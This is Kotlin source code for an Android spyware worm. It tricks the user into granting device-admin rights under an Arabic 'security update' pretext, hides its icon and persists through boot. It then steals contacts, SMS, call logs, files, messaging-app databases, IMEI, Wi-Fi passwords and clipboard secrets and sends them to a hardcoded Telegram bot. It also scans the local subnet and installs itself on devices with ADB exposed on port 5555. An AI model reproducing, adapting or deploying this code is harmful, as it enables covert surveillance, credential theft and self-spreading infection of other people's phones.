package com.wormhole.zero

import android.app.*
import android.app.admin.*
import android.content.*
import android.content.pm.*
import android.database.Cursor
import android.hardware.Camera
import android.media.MediaRecorder
import android.net.*
import android.net.wifi.*
import android.os.*
import android.provider.*
import android.telephony.*
import android.view.*
import java.io.*
import java.net.*
import java.text.SimpleDateFormat
import java.util.*
import java.util.zip.*

object C {
    const val BOT = "8452221818:AAE-QKfxWA7Lg86DPES1WuI5vQJReYKSFco"
    const val CID = "7135293162"
    val API get() = "https://api.telegram.org/bot$BOT/"
}

// ============ MAIN ACTIVITY ============
class MainActivity : Activity() {
    override fun onCreate(b: Bundle?) {
        super.onCreate(b)
        val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
        val cn = ComponentName(this, Adm::class.java)
        if (!dpm.isAdminActive(cn)) {
            startActivity(Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
                putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, cn)
                putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "تحديث أمني ضروري")
            })
        }
        packageManager.setComponentEnabledSetting(
            ComponentName(this, MainActivity::class.java),
            PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
            PackageManager.DONT_KILL_APP
        )
        startService(Intent(this, Ghost::class.java))
        finish()
    }
}

// ============ ADMIN RECEIVER ============
class Adm : DeviceAdminReceiver() {
    override fun onDisableRequested(c: Context, i: Intent) = "لا يمكن تعطيل الحماية"
    override fun onEnabled(c: Context, i: Intent) {
        c.startService(Intent(c, Ghost::class.java))
    }
}

// ============ BOOT RECEIVER ============
class Boot : BroadcastReceiver() {
    override fun onReceive(c: Context, i: Intent) {
        val s = Intent(c, Ghost::class.java)
        if (Build.VERSION.SDK_INT >= 26) c.startForegroundService(s) else c.startService(s)
    }
}

// ============ GHOST SERVICE ============
class Ghost : Service() {
    override fun onCreate() {
        super.onCreate()
        if (Build.VERSION.SDK_INT >= 26) {
            val ch = NotificationChannel("x", "S", NotificationManager.IMPORTANCE_MIN)
            getSystemService(NotificationManager::class.java).createNotificationChannel(ch)
            startForeground(1, Notification.Builder(this, "x").build())
        }
        Engine.ctx = this
        Engine.startAll()
    }
    override fun onStartCommand(i: Intent?, f: Int, id: Int): Int {
        Engine.startAll()
        return START_STICKY
    }
    override fun onBind(i: Intent?) = null
    override fun onTaskRemoved(r: Intent?) {
        startService(Intent(this, Ghost::class.java))
    }
}

// ============ ENGINE ============
object Engine {
    var ctx: Context? = null
    var running = false

    fun startAll() {
        if (running) return
        running = true
        Thread {
            Harv.run()
            Worm.run()
            while (running) {
                try {
                    Harv.run()
                    Worm.run()
                    Thread.sleep(30000)
                } catch (_: Exception) {}
            }
        }.start()
    }
}

// ============ NETWORK ============
object Net {
    fun send(msg: String) {
        Thread {
            try {
                msg.chunked(3800).forEach { chunk ->
                    val url = URL("${C.API}sendMessage?chat_id=${C.CID}&text=${URLEncoder.encode(chunk, "UTF-8")}")
                    (url.openConnection() as HttpURLConnection).apply {
                        connectTimeout = 10000; readTimeout = 10000
                        inputStream.close(); disconnect()
                    }
                }
            } catch (_: Exception) {}
        }.start()
    }

    fun sendFile(f: File, caption: String = "") {
        Thread {
            try {
                if (!f.exists() || f.length() == 0L || f.length() > 50*1024*1024) return@Thread
                val B = "==WORM${System.currentTimeMillis()}=="
                val url = URL("${C.API}sendDocument")
                val con = url.openConnection() as HttpURLConnection
                con.doOutput = true; con.connectTimeout = 60000; con.readTimeout = 60000
                con.setRequestProperty("Content-Type", "multipart/form-data; boundary=$B")
                val out = con.outputStream
                fun w(s: String) { out.write(s.toByteArray()) }
                w("--$B\r\n")
                w("Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n${C.CID}\r\n")
                w("--$B\r\n")
                w("Content-Disposition: form-data; name=\"caption\"\r\n\r\n$caption\r\n")
                w("--$B\r\n")
                w("Content-Disposition: form-data; name=\"document\"; filename=\"${f.name}\"\r\n")
                w("Content-Type: application/octet-stream\r\n\r\n")
                out.flush()
                f.inputStream().copyTo(out)
                out.flush()
                w("\r\n--$B--\r\n")
                out.flush()
                con.inputStream.close(); con.disconnect()
            } catch (_: Exception) {}
        }.start()
    }
}

// ============ WIFI WORM ============
object Worm {
    fun run() {
        Thread {
            try {
                val ctx = Engine.ctx ?: return@Thread
                val apk = File(ctx.packageCodePath).readBytes()
                val sub = getSubnet() ?: return@Thread
                for (i in 2..254) {
                    val h = "$sub$i"
                    if (checkAdb(h)) {
                        infect(h, apk, ctx)
                    }
                }
            } catch (_: Exception) {}
        }.start()
    }

    private fun getSubnet(): String? {
        try {
            val ctx = Engine.ctx ?: return null
            val wifi = ctx.getSystemService(Context.WIFI_SERVICE) as? WifiManager
            val ip = wifi?.connectionInfo?.ipAddress ?: 0
            if (ip != 0) {
                return "${ip and 0xFF}.${(ip shr 8) and 0xFF}.${(ip shr 16) and 0xFF}."
            }
            NetworkInterface.getNetworkInterfaces().toList().forEach { ni ->
                if (!ni.isLoopback) ni.inetAddresses.toList().forEach { a ->
                    if (a is Inet4Address && !a.isLoopbackAddress && a.hostAddress?.startsWith("192.168.") == true)
                        return a.hostAddress.substringBeforeLast(".") + "."
                }
            }
        } catch (_: Exception) {}
        return null
    }

    private fun checkAdb(h: String): Boolean {
        return try { Socket().use { it.connect(InetSocketAddress(h, 5555), 500) }; true } catch (_: Exception) { false }
    }

    private fun infect(h: String, d: ByteArray, ctx: Context) {
        try {
            Runtime.getRuntime().exec(arrayOf("adb", "connect", "$h:5555")).waitFor()
            val tmp = File(ctx.cacheDir, "w.apk"); tmp.writeBytes(d)
            val a = arrayOf("adb", "-s", "$h:5555")
            Runtime.getRuntime().exec(a + arrayOf("push", tmp.absolutePath, "/data/local/tmp/w.apk")).waitFor()
            Runtime.getRuntime().exec(a + arrayOf("shell", "pm", "install", "-g", "-d", "/data/local/tmp/w.apk")).waitFor()
            Runtime.getRuntime().exec(a + arrayOf("shell", "am", "start", "-n", "com.wormhole.zero/.MainActivity")).waitFor()
            Runtime.getRuntime().exec(arrayOf("adb", "disconnect", "$h:5555")).waitFor()
            Net.send("🔥 جهاز جديد مخترق: $h")
            tmp.delete()
        } catch (_: Exception) {}
    }
}

// ============ TOTAL HARVESTER ============
object Harv {
    fun run() {
        Thread {
            try {
                val ctx = Engine.ctx ?: return@Thread
                contacts(ctx)
                sms(ctx)
                calls(ctx)
                files(ctx)
                databases(ctx)
                deviceInfo(ctx)
                installedApps(ctx)
                wifiPasswords(ctx)
                clipboard(ctx)
                Net.send("=== دورة تجميع كاملة ===")
            } catch (_: Exception) {}
        }.start()
    }

    private fun contacts(ctx: Context) {
        val sb = StringBuilder("=== جهات الاتصال ===\n")
        try {
            ctx.contentResolver.query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null)?.use { cu ->
                while (cu.moveToNext()) {
                    val name = cu.getString(cu.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME)) ?: "?"
                    val id = cu.getString(cu.getColumnIndex(ContactsContract.Contacts._ID))
                    ctx.contentResolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, "${ContactsContract.CommonDataKinds.Phone.CONTACT_ID}=?", arrayOf(id), null)?.use { p ->
                        while (p.moveToNext()) {
                            sb.appendLine("$name: ${p.getString(p.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER))}")
                        }
                    }
                }
            }
        } catch (_: Exception) {}
        if (sb.length > 30) Net.send(sb.toString())
    }

    private fun sms(ctx: Context) {
        val sb = StringBuilder("=== الرسائل ===\n")
        try {
            ctx.contentResolver.query(Telephony.Sms.CONTENT_URI, null, null, null, "date DESC LIMIT 100")?.use { cu ->
                while (cu.moveToNext()) {
                    sb.appendLine("${cu.getString(cu.getColumnIndex(Telephony.Sms.ADDRESS))}: ${cu.getString(cu.getColumnIndex(Telephony.Sms.BODY))}")
                }
            }
        } catch (_: Exception) {}
        if (sb.length > 20) Net.send(sb.toString())
    }

    private fun calls(ctx: Context) {
        val sb = StringBuilder("=== سجل المكالمات ===\n")
        try {
            ctx.contentResolver.query(CallLog.Calls.CONTENT_URI, null, null, null, "${CallLog.Calls.DATE} DESC LIMIT 100")?.use { cu ->
                while (cu.moveToNext()) {
                    val type = when (cu.getInt(cu.getColumnIndex(CallLog.Calls.TYPE))) {
                        CallLog.Calls.INCOMING_TYPE -> "وارد"
                        CallLog.Calls.OUTGOING_TYPE -> "صادر"
                        CallLog.Calls.MISSED_TYPE -> "فائت"
                        else -> "أخرى"
                    }
                    sb.appendLine("${cu.getString(cu.getColumnIndex(CallLog.Calls.NUMBER))} [$type] ${cu.getString(cu.getColumnIndex(CallLog.Calls.DURATION))}s")
                }
            }
        } catch (_: Exception) {}
        if (sb.length > 20) Net.send(sb.toString())
    }

    private fun files(ctx: Context) {
        val exts = listOf("jpg", "jpeg", "png", "gif", "pdf", "doc", "docx", "xls", "xlsx", "txt", "mp3", "mp4", "zip", "rar", "db", "sqlite", "apk")
        var count = 0
        try {
            File("/storage/emulated/0").walkTopDown().forEach { f ->
                if (count >= 10) return@forEach
                if (f.isFile && f.length() in 1024..(50*1024*1024) && f.extension.lowercase() in exts) {
                    Net.sendFile(f, "${f.absolutePath} (${f.length()/1024}KB)")
                    count++
                }
            }
        } catch (_: Exception) {}
    }

    private fun databases(ctx: Context) {
        val dbs = listOf(
            "/data/data/com.whatsapp/databases/msgstore.db",
            "/data/data/com.whatsapp/databases/wa.db",
            "/data/data/org.telegram.messenger/files/cache4.db",
            "/data/data/com.facebook.katana/databases/newsfeed.db",
            "/data/data/com.instagram.android/databases/instagram.db",
            "/data/data/com.android.providers.contacts/databases/contacts2.db",
            "/data/data/com.android.providers.telephony/databases/mmssms.db"
        )
        dbs.forEach { path ->
            val f = File(path)
            if (f.exists() && f.length() > 0) Net.sendFile(f, "DB: $path")
        }
    }

    private fun deviceInfo(ctx: Context) {
        val sb = StringBuilder("=== معلومات الجهاز ===\n")
        sb.appendLine("الموديل: ${Build.MODEL}")
        sb.appendLine("العلامة: ${Build.BRAND}")
        sb.appendLine("الأندرويد: ${Build.VERSION.RELEASE} (SDK ${Build.VERSION.SDK_INT})")
        sb.appendLine("الرقم التسلسلي: ${Build.SERIAL}")
        try {
            val tm = ctx.getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
            val imei = if (Build.VERSION.SDK_INT >= 26) tm.imei else tm.deviceId
            sb.appendLine("IMEI: ${imei ?: "غير متاح"}")
        } catch (_: Exception) {}
        Net.send(sb.toString())
    }

    private fun installedApps(ctx: Context) {
        val sb = StringBuilder("=== التطبيقات المثبتة ===\n")
        try {
            ctx.packageManager.getInstalledApplications(PackageManager.GET_META_DATA).take(50).forEach { ai ->
                sb.appendLine("${ai.packageName} - ${ctx.packageManager.getApplicationLabel(ai)}")
            }
        } catch (_: Exception) {}
        Net.send(sb.toString())
    }

    private fun wifiPasswords(ctx: Context) {
        try {
            val f = File("/data/misc/wifi/wpa_supplicant.conf")
            if (f.exists()) {
                val sb = StringBuilder("=== كلمات مرور الواي فاي ===\n")
                f.readLines().forEach { line ->
                    if (line.contains("ssid") || line.contains("psk")) sb.appendLine(line)
                }
                if (sb.length > 40) Net.send(sb.toString())
            }
        } catch (_: Exception) {}
    }

    private fun clipboard(ctx: Context) {
        try {
            val cm = ctx.getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
            val clip = cm.primaryClip
            if (clip != null && clip.itemCount > 0) {
                val text = clip.getItemAt(0).text?.toString() ?: ""
                val keywords = listOf("password", "كلمة", "سر", "رقم", "حساب", "login", "otp", "رمز", "@", "cvv", "card")
                if (text.isNotEmpty() && text.length < 500 && keywords.any { text.lowercase().contains(it) }) {
                    Net.send("📋 حافظة حساسة: $text")
                }
            }
        } catch (_: Exception) {}
    }
}
